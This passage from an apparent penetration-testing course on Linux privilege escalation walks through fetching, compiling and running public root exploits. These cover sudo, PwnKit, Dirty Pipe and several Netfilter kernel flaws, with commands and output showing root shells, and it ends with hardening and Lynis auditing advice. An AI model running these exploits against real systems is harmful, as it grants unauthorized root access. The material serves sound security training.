using <span class="hljs-symbol">target:</span> Ubuntu <span class="hljs-number">20.04</span>.<span class="hljs-number">1</span> (Focal Fossa) - sudo <span class="hljs-number">1.8</span>.<span class="hljs-number">31</span>, libc-<span class="hljs-number">2.31</span> [<span class="hljs-string">'/usr/bin/sudoedit'</span>] (<span class="hljs-number">56</span>, <span class="hljs-number">54</span>, <span class="hljs-number">63</span>, <span class="hljs-number">212</span>)
** pray <span class="hljs-keyword">for</span> your rootshell.. **

<span class="hljs-comment"># id</span>

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<hr>
<h3 id="sudo-policy-bypass">Sudo Policy Bypass</h3>
<p>Another vulnerability was found in 2019 that affected all versions below <code>1.8.28</code>, which allowed privileges to escalate even with a simple command. This vulnerability has the <a href="https://www.sudo.ws/security/advisories/minus\_1\_uid/">CVE-2019-14287</a> and requires only a single prerequisite. It had to allow a user in the <code>/etc/sudoers</code> file to execute a specific command.</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3@nix02:~$ sudo -l
[sudo] password <span class="hljs-keyword">for</span> cry0l1t3: **********

User cry0l1t3 may <span class="hljs-built_in">run</span> <span class="hljs-keyword">the</span> following commands <span class="hljs-keyword">on</span> Penny:
    ALL=(ALL) /usr/bin/<span class="hljs-built_in">id</span>
</code></pre>
<p>In fact, <code>Sudo</code> also allows commands with specific user IDs to be executed, which executes the command with the user&#39;s privileges carrying the specified ID. The ID of the specific user can be read from the <code>/etc/passwd</code> file.</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /etc/passwd | grep cry0l1t3

<span class="hljs-symbol">cry0l1t3:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:cry0l1t3</span>,,,<span class="hljs-symbol">:/home/cry0l1t3</span><span class="hljs-symbol">:/bin/bash</span>
</code></pre>
<p>Thus the ID for the user <code>cry0l1t3</code> would be <code>1005</code>. If a negative ID (<code>-1</code>) is entered at <code>sudo</code>, this results in processing the ID <code>0</code>, which only the <code>root</code> has. This, therefore, led to the immediate root shell.</p>
<p>Sudo</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -u<span class="hljs-comment">#-1 id</span>

root<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:/home/cry0l1t3</span><span class="hljs-comment"># id</span>

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1005</span>(cry0l1t3) groups=<span class="hljs-number">1005</span>(cry0l1t3)
</code></pre>
<h2 id="polkit">Polkit</h2>
<hr>
<p>PolicyKit (<code>polkit</code>) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, <code>polkit</code> is asked. It is possible to set how permissions are granted by default for each user and application. For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required. For individual users and groups, the authorizations can be assigned individually.</p>
<p>Polkit works with two groups of files.</p>
<ol>
<li>actions/policies (<code>/usr/share/polkit-1/actions</code>)</li>
<li>rules (<code>/usr/share/polkit-1/rules.d</code>)</li>
</ol>
<p>Polkit also has <code>local authority</code> rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory <code>/etc/polkit-1/localauthority/50-local.d</code> with the file extension <code>.pkla</code>.</p>
<p>PolKit also comes with three additional programs:</p>
<ul>
<li><code>pkexec</code> - runs a program with the rights of another user or with root rights</li>
<li><code>pkaction</code> - can be used to display actions</li>
<li><code>pkcheck</code> - this can be used to check if a process is authorized for a specific action</li>
</ul>
<p>The most interesting tool for us, in this case, is <code>pkexec</code> because it performs the same task as <code>sudo</code> and can run a program with the rights of another user or root.</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><span class="hljs-comment"># pkexec -u &lt;user&gt; &lt;command&gt;</span>
cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>pkexec -u root id

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<p>In the <code>pkexec</code> tool, the memory corruption vulnerability with the identifier <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034">CVE-2021-4034</a> was found, also known as <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">Pwnkit</a> and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.</p>
<p>To exploit this vulnerability, we need to download a <a href="https://github.com/arthepsy/CVE-2021-4034">PoC</a> and compile it on the target system itself or a copy we have made.</p>
<pre><code class="lang-shell-session">cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>.git
cry0l1t3@nix02:~$ cd CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>
cry0l1t3@nix02:~$ gcc cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc.c -o poc
</code></pre>
<p>Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (<code>sh</code>) to Bash (<code>bash</code>) and check the user&#39;s IDs.</p>
<pre><code class="lang-shell-session">cry<span class="hljs-number">0</span>l<span class="hljs-number">1</span>t<span class="hljs-number">3</span>@<span class="hljs-symbol">nix02</span>:~$ ./poc

<span class="hljs-attr"># id

uid=0</span><span class="hljs-comment">(root)</span> gid=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span> groups=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span>
</code></pre>
<h2 id="dirty-pipe">Dirty Pipe</h2>
<hr>
<p>A vulnerability in the Linux kernel, named <a href="https://dirtypipe.cm4all.com/">Dirty Pipe</a> (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847">CVE-2022-0847</a>), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the <a href="https://dirtycow.ninja/">Dirty Cow</a> vulnerability discovered in 2016. All kernels from version <code>5.8</code> to <code>5.17</code> are affected and vulnerable to this vulnerability.</p>
<p>In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.</p>
<p>This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the <code>/etc/passwd</code> file and remove the password prompt for the root. This would allow us to log in with the <code>su</code> command without the password prompt.</p>
<p>To exploit this vulnerability, we need to download a <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">PoC</a> and compile it on the target system itself or a copy we have made.</p>
<p><strong>Download Dirty Pipe Exploit</strong></p>
<p>Dirty Pipe</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>git clone <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/</span>AlexisAhmed/CVE-<span class="hljs-number">2022</span>-0847-DirtyPipe-Exploits.git
cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd CVE-<span class="hljs-number">2022</span>-0847-DirtyPipe-Exploits
cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>bash compile.sh
</code></pre>
<p>After compiling the code, we have two different exploits available. The first exploit version (<code>exploit-1</code>) modifies the <code>/etc/passwd</code> and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.</p>
<p><strong>Verify Kernel Version</strong></p>
<p>Dirty Pipe</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@nix02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>uname -r

<span class="hljs-number">5.13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">46</span>-generic
</code></pre>
<p><strong>Exploitation</strong></p>
<p>Dirty Pipe</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-meta">@nix</span><span class="hljs-number">02:</span>~$ ./exploit<span class="hljs-number">-1</span>

Backing up <span class="hljs-regexp">/etc/</span>passwd to <span class="hljs-regexp">/tmp/</span>passwd.bak ...
Setting root password to <span class="hljs-string">"piped"</span>...
<span class="hljs-string">Password:</span> Restoring <span class="hljs-regexp">/etc/</span>passwd from <span class="hljs-regexp">/tmp/</span>passwd.bak...
Done! Popping shell... (run commands now)

id

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<p>With the help of the 2nd exploit version (<code>exploit-2</code>), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:</p>
<p><strong>Find SUID Binaries</strong></p>
<p>Dirty Pipe</p>
<pre><code class="lang-shell-session">cry0l1t3@<span class="hljs-symbol">nix02:</span>~$ find / -perm -<span class="hljs-number">4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span>

/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">dbus</span>-1.0/<span class="hljs-title">dbus</span>-<span class="hljs-title">daemon</span>-<span class="hljs-title">launch</span>-<span class="hljs-title">helper</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">openssh</span>/<span class="hljs-title">ssh</span>-<span class="hljs-title">keysign</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">snapd</span>/<span class="hljs-title">snap</span>-<span class="hljs-title">confine</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">policykit</span>-1/<span class="hljs-title">polkit</span>-<span class="hljs-title">agent</span>-<span class="hljs-title">helper</span>-1</span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">eject</span>/<span class="hljs-title">dmcrypt</span>-<span class="hljs-title">get</span>-<span class="hljs-title">device</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">xorg</span>/<span class="hljs-title">Xorg</span>.<span class="hljs-title">wrap</span></span>
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
</code></pre>
<p>Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.</p>
<p><strong>Exploitation</strong></p>
<p>Dirty Pipe</p>
<pre><code class="lang-shell-session">cry0l1t3@nix02:~$ ./exploit<span class="hljs-number">-2</span> /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">4</span>(adm),<span class="hljs-number">24</span>(cdrom),<span class="hljs-number">27</span>(sudo),<span class="hljs-number">30</span>(dip),<span class="hljs-number">46</span>(plugdev),<span class="hljs-number">120</span>(lpadmin),<span class="hljs-number">131</span>(lxd),<span class="hljs-number">132</span>(sambashare),<span class="hljs-number">1000</span>(cry0l1t3)
</code></pre>
<h2 id="netfilter">Netfilter</h2>
<hr>
<p><code>Netfilter</code> is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. <code>Netfilter</code> is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like <code>iptables</code> and <code>arptables</code>, which serve as action mechanisms of the <code>Netfilter</code> hook system of the IPv4 and IPv6 protocol stack.</p>
<p>This kernel module has three main functions:</p>
<ol>
<li>Packet defragmentation</li>
<li>Connection tracking</li>
<li>Network address translation (NAT)</li>
</ol>
<p>When the module is activated, all IP packets are checked by the <code>Netfilter</code> before they are forwarded to the target application of the own or remote system. In 2021 (<a href="https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555">CVE-2021-22555</a>), 2022 (<a href="https://github.com/pqlx/CVE-2022-1015">CVE-2022-1015</a>), and also in 2023 (<a href="https://github.com/Liuk3r/CVE-2023-32233">CVE-2023-32233</a>), several vulnerabilities were found that could lead to privilege escalation.</p>
<p>Many companies have preconfigured Linux distributions adapted to their software applications or vice versa. This gives the developers and administrators, metaphorically speaking, a &quot;dynamic basis&quot; that is difficult to replace. This would require either adapting the system to the software application or adapting the application to the newer system. Depending on the size and complexity of the application, this can take a great deal of time and effort. This is often why so many companies run older and not updated Linux distributions in production.</p>
<p>Even if the company uses virtual machines or containers like Docker, these are built on a specific kernel. The idea of isolating the software application from the existing host system is a good step, but there are many ways to break out of such a container.</p>
<p><strong>CVE-2021-22555</strong></p>
<p>Vulnerable kernel versions: 2.6 - 5.11</p>
<p>Netfilter</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>uname -r

<span class="hljs-number">5.10</span>.<span class="hljs-number">5</span>-<span class="hljs-number">051005</span>-generic
</code></pre>
<p>Netfilter</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/raw.githubusercontent.com/google</span><span class="hljs-regexp">/security-research/master</span><span class="hljs-regexp">/pocs/linux</span><span class="hljs-regexp">/cve-2021-22555/exploit</span>.c
cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>gcc -m32 -static exploit.c -o exploit
cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./exploit

[+] Linux Privilege Escalation by theflow@ - <span class="hljs-number">2021</span>

[+] STAGE <span class="hljs-number">0</span>: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets <span class="hljs-keyword">and</span> message queues...

[+] STAGE <span class="hljs-number">1</span>: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes <span class="hljs-keyword">in</span> primary messages...
[*] Triggering out-of-bounds write...
[*] Searching <span class="hljs-keyword">for</span> corrupted primary message...
[+] <span class="hljs-symbol">fake_idx:</span> fff
[+] <span class="hljs-symbol">real_idx:</span> fdf

...SNIP...

root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/cry0l1t3</span><span class="hljs-comment"># id</span>

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<p><strong>CVE-2022-25636</strong></p>
<p>A recent vulnerability is <a href="https://www.cvedetails.com/cve/CVE-2022-25636/">CVE-2022-25636</a> and affects Linux kernel 5.4 through 5.6.10. This is <code>net/netfilter/nf_dup_netdev.c</code>, which can grant root privileges to local users due to heap out-of-bounds write. <code>Nick Gregory</code> wrote a very detailed <a href="https://nickgregory.me/post/2022/03/12/cve-2022-25636/">article</a> about how he discovered this vulnerability.</p>
<p>Netfilter</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>uname -r

<span class="hljs-number">5.13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">051300</span>-generic
</code></pre>
<p>However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.</p>
<p>Netfilter</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-symbol">@ubuntu</span>:~$ git clone https://github.com/Bonfee/CVE<span class="hljs-number">-2022</span><span class="hljs-number">-25636.</span>git
cry0l1t3<span class="hljs-symbol">@ubuntu</span>:~$ cd CVE<span class="hljs-number">-2022</span><span class="hljs-number">-25636</span>
cry0l1t3<span class="hljs-symbol">@ubuntu</span>:~$ make
cry0l1t3<span class="hljs-symbol">@ubuntu</span>:~$ ./exploit

[*] <span class="hljs-keyword">STEP</span> <span class="hljs-number">1</span>: Leak child <span class="hljs-literal">and</span> parent net_device
[+] parent net_device <span class="hljs-built_in">ptr</span>: <span class="hljs-number">0xffff991285dc0000</span>
[+] child  net_device <span class="hljs-built_in">ptr</span>: <span class="hljs-number">0xffff99128e5a9000</span>

[*] <span class="hljs-keyword">STEP</span> <span class="hljs-number">2</span>: Spray kmalloc<span class="hljs-number">-192</span>, overwrite msg_msg.security <span class="hljs-built_in">ptr</span> <span class="hljs-literal">and</span> free net_device
[+] net_device struct freed

[*] <span class="hljs-keyword">STEP</span> <span class="hljs-number">3</span>: Spray kmalloc<span class="hljs-number">-4</span>k using setxattr + FUSE <span class="hljs-keyword">to</span> realloc net_device
[+] obtained net_device struct

[*] <span class="hljs-keyword">STEP</span> <span class="hljs-number">4</span>: Leak kaslr
[*] kaslr leak: <span class="hljs-number">0xffffffff823093c0</span>
[*] kaslr base: <span class="hljs-number">0xffffffff80ffefa0</span>

[*] <span class="hljs-keyword">STEP</span> <span class="hljs-number">5</span>: Release setxattrs, free net_device, <span class="hljs-literal">and</span> realloc it again
[+] obtained net_device struct

[*] <span class="hljs-keyword">STEP</span> <span class="hljs-number">6</span>: rop :)

<span class="hljs-meta"># id</span>

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<p><strong>CVE-2023-32233</strong></p>
<p>This vulnerability exploits the so called <code>anonymous sets</code> in <code>nf_tables</code> by using the <code>Use-After-Free</code> vulnerability in the Linux Kernel up to version <code>6.3.1</code>. These <code>nf_tables</code> are temprorary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (<code>Use-After-Free</code>) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.</p>
<p>The exploitation is done by manipulating the system to use the <code>cleared out</code> anonymous sets to interact with the kernel&#39;s memory. By doing so, we can potentially gain <code>root</code> privileges.</p>
<p><strong>Proof-Of-Concept</strong></p>
<p>Netfilter</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>git clone <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/</span>Liuk3r/CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">32233</span>
cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">32233</span>
cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/CVE-</span><span class="hljs-number">2023</span>-<span class="hljs-number">32233</span><span class="hljs-variable">$ </span>gcc -Wall -o exploit exploit.c -lmnl -lnftnl
</code></pre>
<p><strong>Exploitation</strong></p>
<p>Netfilter</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/CVE-</span><span class="hljs-number">2023</span>-<span class="hljs-number">32233</span><span class="hljs-variable">$ </span>./exploit

[*] Netfilter UAF exploit

Using <span class="hljs-symbol">profile:</span>
========
<span class="hljs-number">1</span>                   race_set_slab                   <span class="hljs-comment"># {0,1}</span>
<span class="hljs-number">1572</span>                race_set_elem_count             <span class="hljs-comment"># k</span>
<span class="hljs-number">4000</span>                initial_sleep                   <span class="hljs-comment"># ms</span>
<span class="hljs-number">100</span>                 race_lead_sleep                 <span class="hljs-comment"># ms</span>
<span class="hljs-number">600</span>                 race_lag_sleep                  <span class="hljs-comment"># ms</span>
<span class="hljs-number">100</span>                 reuse_sleep                     <span class="hljs-comment"># ms</span>
<span class="hljs-number">39</span>d24<span class="hljs-number">0</span>              free_percpu                     <span class="hljs-comment"># hex</span>
<span class="hljs-number">2</span>a8b90<span class="hljs-number">0</span>             modprobe_path                   <span class="hljs-comment"># hex</span>
<span class="hljs-number">23700</span>               nft_counter_destroy             <span class="hljs-comment"># hex</span>
<span class="hljs-number">347</span>a<span class="hljs-number">0</span>               nft_counter_ops                 <span class="hljs-comment"># hex</span>
a                   nft_counter_destroy_call_offset <span class="hljs-comment"># hex</span>
ffffffff            nft_counter_destroy_call_mask   <span class="hljs-comment"># hex</span>
e8e58948            nft_counter_destroy_call_check  <span class="hljs-comment"># hex</span>
========

[*] Checking <span class="hljs-keyword">for</span> available CPUs...
[*] sched_getaffinity() =&gt; <span class="hljs-number">0</span> <span class="hljs-number">2</span>
[*] Reserved CPU <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> PWN Worker
[*] Started cpu_spinning_loop() on CPU <span class="hljs-number">1</span>
[*] Started cpu_spinning_loop() on CPU <span class="hljs-number">2</span>
[*] Started cpu_spinning_loop() on CPU <span class="hljs-number">3</span>
[*] Creating <span class="hljs-string">"/tmp/modprobe"</span>...
[*] Creating <span class="hljs-string">"/tmp/trigger"</span>...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting <span class="hljs-keyword">for</span> PWN Worker...

...SNIP...

[*] You<span class="hljs-string">'ve Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)</span>
</code></pre>
<p>Please keep in mind that these exploits can be very unstable and can break the system.</p>
<h2 id="linux-hardening">Linux Hardening</h2>
<hr>
<p>Proper Linux hardening can eliminate most, if not all, opportunities for local privilege escalation. The following steps should be taken, at a minimum, to reduce the risk of an attack being able to elevate to root-level access:</p>
<hr>
<h3 id="updates-and-patching">Updates and Patching</h3>
<p>Many quick and easy privilege escalation exploits exist for out-of-date Linux kernels and known vulnerable versions of built-in and third-party services. Performing periodic updates will remove some of the most &quot;low hanging fruit&quot; that can be leveraged to escalate privileges. On Ubuntu, the package <a href="https://packages.ubuntu.com/jammy/admin/unattended-upgrades">unattended-upgrades</a> is installed by default from 18.04 onwards and can be manually installed on Ubuntu dating back to at least 10.04 (Lucid). Debian based operating systems going back to before Jessie also have this package available. On Red Hat based systems, the <a href="https://man7.org/linux/man-pages/man8/yum-cron.8.html">yum-cron</a> package performs a similar task.</p>
<hr>
<h3 id="configuration-management">Configuration Management</h3>
<p>This is by no means an exhaustive list, but some simple hardening measures are to:</p>
<ul>
<li>Audit writable files and directories and any binaries set with the SUID bit.</li>
<li>Ensure that any cron jobs and sudo privileges specify any binaries using the absolute path.</li>
<li>Do not store credentials in cleartext in world-readable files.</li>
<li>Clean up home directories and bash history.</li>
<li>Ensure that low-privileged users cannot modify any custom libraries called by programs.</li>
<li>Remove any unnecessary packages and services that potentially increase the attack surface.</li>
<li>Consider implementing <a href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a>, which provides additional access controls on the system.</li>
</ul>
<hr>
<h3 id="user-management">User Management</h3>
<p>We should limit the number of user accounts and admin accounts on each system, ensure that logon attempts (valid/invalid) are logged and monitored. It is also a good idea to enforce a strong password policy, rotate passwords periodically, and restrict users from reusing old passwords by using the /etc/security/opasswd file with the PAM module. We should check that users are not placed into groups that give them excessive rights not needed for their day-to-day tasks and limit sudo rights based on the principle of least privilege.</p>
<p>Templates exist for configuration management automation tools such as <a href="https://puppet.com/use-cases/configuration-management/">Puppet</a>, <a href="https://github.com/saltstack/salt">SaltStack</a>, <a href="https://en.wikipedia.org/wiki/Zabbix">Zabbix</a> and <a href="https://en.wikipedia.org/wiki/Nagios">Nagios</a> to automate such checks and can be used to push messages to a Slack channel or email box as well as via other methods. Remote actions (Zabbix) and Remediation Actions (Nagios) can be used to find and auto correct these issues over a fleet of nodes. Tools such as Zabbix also feature functions such as checksum verification, which can be used for both version control and to confirm sensitive binaries have not been tampered with. For example, via the <a href="https://www.zabbix.com/documentation/4.0/manual/config/items/itemtypes/zabbix\_agent">vfs.file.cksum</a> file.</p>
<hr>
<h3 id="audit">Audit</h3>
<p>Perform periodic security and configuration checks of all systems. There are several security baselines such as the DISA <a href="https://public.cyber.mil/stigs/">Security Technical Implementation Guides (STIGs)</a> that can be followed to set a standard for security across all operating system types and devices. Many compliance frameworks exist, such as <a href="https://www.iso.org/isoiec-27001-information-security.html">ISO27001</a>, <a href="https://www.pcisecuritystandards.org/pci\_security/">PCI-DSS</a>, and <a href="https://www.hhs.gov/hipaa/for-professionals/security/index.html">HIPAA</a> which can be used by an organization to help establish security baselines. These should all be used as reference guides and not the basis for a security program. A strong security program should have controls tailored to the organization&#39;s needs, operating environment, and the types of data that they store and process (i.e., personal health information, financial data, trade secrets, or publicly available information).</p>
<p>An audit and configuration review is not a replacement for a penetration test or other types of technical, hands-on assessments and is often seen as a &quot;box-checking&quot; exercise in which an organization is &quot;passed&quot; on a controls audit for performing the bare minimum. These reviews can help supplement regular vulnerability scanning and penetration testing and strong patch, vulnerability, and configuration management programs.</p>
<p>One useful tool for auditing Unix-based systems (Linux, macOS, BDS, etc.) is <a href="https://github.com/CISOfy/lynis">Lynis</a>. This tool audits the current configuration of a system and provides additional hardening tips, taking into consideration various standards. It can be used by internal teams such as system administrators as well as third-parties (auditors and penetration testers) to obtain a &quot;baseline&quot; of the system&#39;s current security configuration. Again, this tool or others like it should not replace the manual techniques discussed in this module but can be a strong supplement to cover areas that may be overlooked.</p>
<p>After cloning the entire repo, we can run the tool by typing <code>./lynis audit system</code> and receive a full report.</p>
<p>Linux Hardening</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ ./lynis audit <span class="hljs-keyword">system</span>

[ Lynis <span class="hljs-number">3.0</span><span class="hljs-number">.1</span> ]

################################################################################
  Lynis comes <span class="hljs-keyword">with</span> ABSOLUTELY NO WARRANTY. This is free software, and you are
  welcome to redistribute it under the terms <span class="hljs-keyword">of</span> the GNU General Public License.
  See the LICENSE file for details about using this software.

  <span class="hljs-number">2007</span><span class="hljs-number">-2020</span>, CISOfy - https:<span class="hljs-comment">//cisofy.com/lynis/</span>
  Enterprise support available (compliance, plugins, interface and tools)
################################################################################


[+] Initializing program
------------------------------------

  ###################################################################
  #                                                                 #
  #   NON-PRIVILEGED SCAN MODE                                      #
  #                                                                 #
  ###################################################################

  NOTES:
  --------------
  * Some tests will be skipped (<span class="hljs-keyword">as</span> they require root permissions)
  * Some tests might fail silently or give different results

  - Detecting OS...                                           [ DONE ]
  - Checking profiles...                                      [ DONE ]

  ---------------------------------------------------
  Program version:           <span class="hljs-number">3.0</span><span class="hljs-number">.1</span>
  Operating <span class="hljs-keyword">system</span>:          Linux
  Operating <span class="hljs-keyword">system</span> name:     Ubuntu
  Operating <span class="hljs-keyword">system</span> version:  <span class="hljs-number">16.04</span>
  Kernel version:            <span class="hljs-number">4.4</span><span class="hljs-number">.0</span>
  Hardware platform:         x86_64
  Hostname:                  NIX02
</code></pre>
<p>The resulting scan will be broken down into warnings:</p>
<p>Linux Hardening</p>
<pre><code class="lang-shell-session">Warnings (<span class="hljs-number">2</span>):
  <span class="hljs-comment">----------------------------</span>
  ! Found <span class="hljs-literal">one</span> <span class="hljs-keyword">or</span> more cronjob <span class="hljs-built_in">files</span> <span class="hljs-keyword">with</span> incorrect <span class="hljs-built_in">file</span> permissions (see <span class="hljs-built_in">log</span> <span class="hljs-keyword">for</span> details) [SCHD<span class="hljs-number">-7704</span>] 
      <span class="hljs-keyword">https</span>://cisofy.com/lynis/controls/SCHD<span class="hljs-number">-7704</span>/

  ! systemd-timesyncd never successfully synchronized <span class="hljs-built_in">time</span> [TIME<span class="hljs-number">-3185</span>] 
      <span class="hljs-keyword">https</span>://cisofy.com/lynis/controls/TIME<span class="hljs-number">-3185</span>/
</code></pre>
<p>Suggestions:</p>
<p>Linux Hardening</p>
<pre><code class="lang-shell-session">Suggestions (<span class="hljs-number">53</span>):
  <span class="hljs-comment">----------------------------</span>
  * Set <span class="hljs-keyword">a</span> password <span class="hljs-keyword">on</span> <span class="hljs-title">GRUB</span> <span class="hljs-title">boot</span> <span class="hljs-title">loader</span> <span class="hljs-title">to</span> <span class="hljs-title">prevent</span> <span class="hljs-title">altering</span> <span class="hljs-title">boot</span> <span class="hljs-title">configuration</span> (<span class="hljs-title">e</span>.<span class="hljs-title">g</span>. <span class="hljs-title">boot</span> <span class="hljs-title">in</span> <span class="hljs-title">single</span> <span class="hljs-title">user</span> <span class="hljs-title">mode</span> <span class="hljs-title">without</span> <span class="hljs-title">password</span>) [<span class="hljs-title">BOOT-5122</span>] 
      <span class="hljs-keyword">https</span>://cisofy.com/lynis/controls/BOOT<span class="hljs-number">-5122</span>/

  * If <span class="hljs-keyword">not</span> required, consider explicit disabling <span class="hljs-keyword">of</span> core dump <span class="hljs-keyword">in</span> /etc/security/limits.conf <span class="hljs-built_in">file</span> [KRNL<span class="hljs-number">-5820</span>] 
      <span class="hljs-keyword">https</span>://cisofy.com/lynis/controls/KRNL<span class="hljs-number">-5820</span>/

